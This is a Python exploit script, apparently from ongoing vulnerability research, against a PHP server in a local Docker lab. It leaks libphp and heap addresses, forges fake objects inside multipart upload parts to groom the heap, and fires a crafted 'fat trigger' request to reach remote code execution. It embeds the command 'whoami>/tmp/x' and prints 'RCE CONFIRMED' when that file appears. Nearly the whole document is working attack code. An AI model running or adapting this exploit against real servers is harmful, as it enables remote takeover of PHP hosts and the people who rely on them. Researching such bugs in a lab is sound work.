#!/usr/bin/env python3
"""oom108: legal tiles (107) + FAT trigger (98g rhythm) — the untested pair.

Synthesis of all tonight's evidence:
  - oom106: NO p0 offset crashes with same-shape fires; AAAA filler
    everywhere doesn't crash either
  - oom107: all-part legal aim flood, same-shape fires: silent
  => the 5.6MB aim body fatals EARLY (few parts registered) and its
     bailout never builds/destroys the big registry => NO deep walk.
     The deep walked teardown belongs to the FAT envelope (thousands
     of parts) — which is why 98g's fat fire crashed at rdi=OBJ after
     the aim sacrifice planted the arena.
  - oom103 ran plant+fat-trigger but with ILLEGAL tiles (bit9 FC=1,
    0-mod-8 grid gap) -> fat walk read them and skipped legally.

oom108 = 107's legal all-part tiles + 98g's fat trigger:
  cycle: warm(WARMUPX) -> probe V -> OBJ(3-bit law) -> AIM flood x3
         -> FAT trigger (payload68 envelope, /oom_mod.php) -> check
         -> if worker crashed, re-warm + re-probe (VAs repeat)
"""
import struct, subprocess, time, re, urllib.request, urllib.error
import payload68

HOST = "http://127.0.0.1:8081"
OUT = lambda s: print(s, flush=True)

def sh(cmd, timeout=90):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout).stdout.strip()

def get(url, timeout=30):
    try:
        return urllib.request.urlopen(url, timeout=timeout).read().decode("utf8", "replace")
    except Exception as e:
        return "ERR %s" % e

def post(url, body, ctype=None, timeout=150):
    req = urllib.request.Request(HOST + url, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return str(r.status), r.read(120)
    except urllib.error.HTTPError as e:
        return str(e.code), e.read(120)
    except Exception as e:
        return "ERR", repr(e).encode()

def sapi(body):
    return post("/oom_sapi.php", body)

def fat_trigger(stamp):
    body = payload68.build_attack(3400, stamp)
    return post("/oom_mod.php", body, ctype="multipart/form-data; boundary=BOUND")

BASE = None
for ln in sh("docker exec php_vuln sh -c 'cat /proc/1/maps'").splitlines():
    if "libphp.so" in ln:
        BASE = int(ln.split("-")[0], 16)
        break
OUT("    libphp=0x%x" % BASE)
assert BASE and BASE > 0x7f0000000000

ZIF = 0x39b8a0
TILE = 176
MAXT = 1537
BOFF = 670

def gs_block():
    hdr = struct.pack("<IIQQ", 1, 0x106, 0, 13)
    s = b"whoami>/tmp/x\x00"
    return hdr + s + b"\x00" * ((-(24 + len(s))) % 8)

def build_tile(OBJ, BOFF, V):
    B = bytearray(TILE)
    struct.pack_into("<II", B, 0x00, 1, 0x108)
    struct.pack_into("<II", B, 0x08, 1, 0)
    struct.pack_into("<Q",  B, 0x10, 0)
    struct.pack_into("<I",  B, 0x2C, 1)
    B[0x18:0x20] = struct.pack("<Q", OBJ + 0x90)
    B[0x50:0x58] = struct.pack("<Q", OBJ + 0x68)
    B[0x58:0x5C] = struct.pack("<I", 6)
    B[0x68:0x68 + 40] = gs_block()
    B[0x90:0xA0] = struct.pack("<QQ", 0, BASE + ZIF)
    T = bytearray(MAXT)
    grid = (8 - (V % 8)) % 8
    for off in range(grid, BOFF - 8, 8):
        struct.pack_into("<Q", T, off, OBJ)
    T[BOFF:BOFF + TILE] = B
    for off in range(BOFF + TILE, MAXT - 8, 8):
        struct.pack_into("<Q", T, off, OBJ)
    return bytes(T)

def probe_copies(needle, maxc=12):
    h = needle.hex()
    for a in range(6):
        out = get("%s?h=%s&chunk=262144&maxc=%d" % (HOST + "/oom_probe.php", h, maxc), timeout=40)
        if out.startswith("ERR") or "Fatal" in out:
            time.sleep(0.5); continue
        m = re.search(r"R=(\d+) d=([0-9a-f ]+)", out)
        if m:
            return [int(x, 16) for x in m.group(2).split()]
    return []

def find_obj(offs):
    for V in offs:
        for b in range(BOFF - 260, MAXT - TILE):
            x = V + b
            if (x & 0xF) == 8 and ((x >> 8) & 1) == 1 and ((x >> 9) & 1) == 0:
                return V, x, b
    return None, None, None

def body_all_parts(tile):
    parts = []
    for i in range(3400):
        parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p%d\"; filename=\"%s\"\r\n"
                     b"Content-Type: text/plain\r\n\r\n%s\r\n" % (i, b"a" * 1525, tile))
    parts.append(b"------X--\r\n")
    return b"".join(parts)

def check_x(tag):
    x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
    if "No such" not in x:
        OUT("    *** %s: /tmp/x EXISTS: %r" % (tag, x))
        return True
    return False

WARM = body_all_parts((b"WARMUPX" * 192 + b"W" * 400)[:1537])
stamp = 6100000

for cyc in range(3):
    OUT("-- cycle %d --" % cyc)
    for i in range(12):
        sapi(WARM)
    offs = probe_copies(b"WARMUPX" * 24, maxc=12)
    OUT("    copies=%s" % ([hex(o) for o in offs[:4]],))
    if not offs:
        continue
    V, OBJ, boff = find_obj(offs)
    OUT("    V=%s OBJ=%s BOFF=%d" % (hex(V) if V else None,
        hex(OBJ) if OBJ else None, boff))
    if not OBJ:
        continue
    AIM = body_all_parts(build_tile(OBJ, boff, V))
    for i in range(3):                       # plant the arena
        code, resp = sapi(AIM)
        OUT("    plant%d: %s" % (i, code))
        if check_x("plant%d" % i):
            raise SystemExit("*** RCE CONFIRMED (plant) ***")
    stamp += 137
    code, resp = fat_trigger(stamp)          # FAT walk (the 98g trigger)
    OUT("    fat: %s %r" % (code, resp[:40]))
    if check_x("fat"):
        raise SystemExit("*** RCE CONFIRMED (fat trigger) ***")
    if code == "ERR":
        time.sleep(4)
OUT("done; /tmp/x=%s" % sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'"))
